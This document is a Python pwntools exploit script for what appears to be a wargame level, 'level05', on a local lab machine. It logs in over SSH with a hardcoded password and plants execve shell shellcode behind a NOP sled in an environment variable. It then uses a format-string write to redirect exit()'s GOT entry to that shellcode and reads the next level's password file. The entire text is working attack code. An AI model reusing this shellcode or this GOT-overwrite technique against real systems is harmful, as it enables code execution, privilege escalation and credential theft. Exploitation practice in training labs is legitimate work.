from pwn import *
import os

target = "/home/users/level05/level05"
env_var = b"\x90" * 1000 + b"\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"

# Change host according to your configuration
s = ssh(
    user="level05",
    host="192.168.56.105",
    password="3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN",
    port=4242
)


# Find exit() in GOT

s.download(target, "level05")
elf = ELF("./level05")
got_exit = elf.got["exit"]
target_addr = 0xffffdc12 # environment variable AAAAAAAA
os.remove("level05")

# the format string offset
offset = 10

# the writes you want to perform
writes = {
    got_exit: target_addr,  # write o() address at exit() GOT address
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)

p = s.process(target, env=env_var)
p.writeline(payload)
p.writeline("cat /home/users/level06/.pass")

#p.interactive()
p.stream()

p.close()
s.close()
